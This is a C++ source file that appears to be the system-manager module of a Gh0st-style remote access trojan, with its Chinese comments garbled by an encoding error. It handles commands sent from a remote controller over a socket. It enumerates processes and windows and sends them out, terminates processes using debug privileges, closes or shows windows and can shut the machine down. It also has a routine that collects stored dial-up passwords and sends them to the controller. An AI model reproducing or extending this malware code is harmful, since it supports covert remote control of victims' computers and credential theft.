// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "..\pch.h"
#include "SystemManager.h"
#include "Dialupass.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

#include "until.h"
#include <tchar.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount);

CSystemManager::CSystemManager(CClientSocket *pClient, BYTE bHow) : CManager(pClient)
{
	m_caseSystemIs = bHow;
	if (m_caseSystemIs == COMMAND_WSLIST)     //����ǻ�ȡ����
	{
		SendWindowsList();
	}
	else if (m_caseSystemIs == COMMAND_SYSTEM)   //����ǻ�ȡ����
	{
		SendProcessList();
	}
}

CSystemManager::~CSystemManager()
{

}
void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	SwitchInputDesktop();
	switch (lpBuffer[0])//�����ǽ��̹���������ݵĺ����� �ж����ĸ�����
	{
	case COMMAND_PSLIST:				//���ͽ����б�
		SendProcessList();	
		break;
	case COMMAND_WSLIST:				//���ʹ����б�
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:				//����20200530
		break;
	case COMMAND_KILLPROCESS:			//�رս���
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
	case COMMAND_WINDOW_CLOSE:			//�رմ���
		CloseTheWindow(lpBuffer + 1);	
		break;
	case COMMAND_WINDOW_TEST:			//�����С�� ���ش��ں�
		ShowTheWindow(lpBuffer + 1);    
		break;
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;

	//����getProcessList�õ���ǰ���̵����� --->lpBuffer
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	
	//���ͺ��� ���ຯ��send ���������Ľ������ݷ���
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendWindowsList()
{
	UINT	nRet = -1;
	//��ȡ�����б�����
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	//���ͱ������Ĵ�������
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}


//����20200530
void CSystemManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	int i = 0;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}

	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;

	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
	
}


//��������
void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	// ��Ϊ�����Ŀ��ܲ�ֹ��һ������������ѭ��
	for (int i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// ����Sleep�£���ֹ����
	Sleep(100);
	// ˢ�½����б�
	SendProcessList();
	// ˢ�´����б�
	SendWindowsList();	
}

BOOL CSystemManager::DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR            szDriveStr[500];
	TCHAR            szDrive[3];
	TCHAR            szDevName[100];
	INT                cchDevName;
	INT                i;

	//������
	if (!pszDosPath || !pszNtPath)
		return FALSE;

	//��ȡ���ش����ַ���
	if (GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for (i = 0; szDriveStr[i]; i += 4)
		{
			if (!lstrcmpi(&(szDriveStr[i]), "A:\\") || !lstrcmpi(&(szDriveStr[i]), "B:\\"))
				continue;

			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if (!QueryDosDevice(szDrive, szDevName, 100))//��ѯ Dos �豸��
				return FALSE;

			cchDevName = lstrlen(szDevName);
			if (_tcsnicmp(pszDosPath, szDevName, cchDevName) == 0)//����
			{
				lstrcpy(pszNtPath, szDrive);//����������
				lstrcat(pszNtPath, pszDosPath + cchDevName);//����·��

				return TRUE;
			}
		}
	}

	lstrcpy(pszNtPath, pszDosPath);

	return FALSE;
}

BOOL CSystemManager::GetProcessFullPath(DWORD dwPID, TCHAR pszFullPath[MAX_PATH])
{
	TCHAR        szImagePath[MAX_PATH];
	HANDLE        hProcess;
	if (!pszFullPath)
		return FALSE;

	pszFullPath[0] = '\0';
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, dwPID);
	if (!hProcess)
		return FALSE;

	if (!GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	if (!DosPathToNtPath(szImagePath, pszFullPath))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);
	return TRUE;
}

LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;	//���վ��
	HANDLE			hProcess = NULL;	//���̾��
	HMODULE			hModules = NULL;	//����ģ����
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};	//��������
	LPBYTE			lpBuffer = NULL;				//
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;

	//��ȡȨ��
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	//����һ�����̿���
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	

	//����һ�»�����
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	//��������,����ƶ˹��е�ö�����ͣ���ʾ���ǽ��̵���������
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	//�õ���һ�����̣�����ʧ�ܾͷ���
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			//�򿪽��̾��
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{

				//strProcessName[0] = '\0';
				//ö�ٵ�һ��ģ����
				//EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				//������bug��û��Ȩ�޵�������޷���ȡ���������ƣ����Է��͹�ȥ������һ����������Ҳ��������ʼ��0����
				//���һ�ȡ�Ľ���·����û������ķ���ȫ�棬���������GetProcessFullPath������ע�͵���
				//��ȡ��������
				//GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				//��ȡ��������
				GetProcessFullPath(pe32.th32ProcessID, strProcessName);

				// �˽���ռ�����ݴ�С
				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
				// ������̫С�������·�����
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				

				//����memcpy�����򻺳����������� ���ݽṹ�� ����ID+������+0+����������+0
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
			}
		}
		while(Process32Next(hSnapshot, &pe32));//��һ������
	}
	//��lpbuffer�����������ȥ 
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);
	return lpBuffer;	
}

//��Ȩ
bool CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}

void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

//���ڻص��������д���
bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
	
	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	//��ȡ�������Ĵ��ھ���ı���
	if (IsWindowVisible(hwnd))
		return true;
	//GetWindowText(hwnd, strTitle, sizeof(strTitle));
	GetWindowTextSafe(hwnd, strTitle, sizeof(strTitle));
	//�жϴ����Ƿ�ɼ��������Ƿ�Ϊ��
	if (lstrlen(strTitle) == 0)
	{
		OutputDebugString("lstrlen");
		return true;
	}
	
	//���ָ��Ϊ�յĻ�����һ����
	//���ú���ʱѭ�������Եڶ��ν����Ͳ��ǿյģ��ö�̬��LocalReAlloc�ı�Ѵ�Сʵ�����ݶ���һ�����ϣ�
	if (lpBuffer == NULL)
		//��һ�������СΪ1����Ϊ��һ�ֽ�Ϊ֪ͨ���ƶ˱�ʶ
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
	
	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	dwOffset = LocalSize(lpBuffer);
	
	//���㻺������С
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	//��ȡ���ڵĴ����� + ����memcpy���ݽṹΪ ������PID + hwnd + ���ڱ��� + 0
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	
	return true;
}


//��ȡ�����б�����
LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;

	//ö����Ļ�ϵ����еĶ��㴰�ڣ������ؽ���Щ���ڵľ�����ݸ�һ��Ӧ�ó�����Ļص�������
	//EnumWindows��һֱ������ȥ��ֱ��ö�������еĶ��㴰�ڣ����߻ص�����������FALSE.
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);

	//����ͷ���TOKEN_WSLIST���ض�ʶ��
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}


//�رմ���
void CSystemManager::CloseTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));				//�õ����ھ�� 
	::PostMessage((HWND__ *)hwnd, WM_CLOSE, 0, 0);	//�򴰿ڷ��͹ر���Ϣ
}

//��ʾ����
void CSystemManager::ShowTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(DWORD));				//�õ����ھ��
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));		//�õ����ڴ������
	ShowWindow((HWND__ *)hwnd, dHow);
}


int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount)
{
	if (NULL == hWnd || FALSE == IsWindow(hWnd) || NULL == lpString || 0 == nMaxCount)
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}
	DWORD dwHwndProcessID = 0;
	DWORD dwHwndThreadID = 0;
	dwHwndThreadID = GetWindowThreadProcessId(hWnd, &dwHwndProcessID);		//��ȡ���������Ľ��̺��߳�ID

	if (dwHwndProcessID != GetCurrentProcessId())		//���ڽ��̲��ǵ�ǰ���ý���ʱ������ԭ������
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}

	//���ڽ����ǵ�ǰ����ʱ��
	if (dwHwndThreadID == GetCurrentThreadId())			//�����߳̾��ǵ�ǰ�����̣߳�����ԭ������
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}

#ifndef _UNICODE
	WCHAR *lpStringUnicode = new WCHAR[nMaxCount];
	InternalGetWindowText(hWnd, lpStringUnicode, nMaxCount);
	int size = WideCharToMultiByte(CP_ACP, 0, lpStringUnicode, -1, NULL, 0, NULL, NULL);
	if (size <= nMaxCount)
	{
		size = WideCharToMultiByte(CP_ACP, 0, lpStringUnicode, -1, lpString, size, NULL, NULL);
		if (NULL != lpStringUnicode)
		{
			delete[]lpStringUnicode;
			lpStringUnicode = NULL;
		}
		return size;
	}
	if (NULL != lpStringUnicode)
	{
		delete[]lpStringUnicode;
		lpStringUnicode = NULL;
	}
	return 0;

#else
	return InternalGetWindowText(hWnd, lpString, nMaxCount);
#endif
}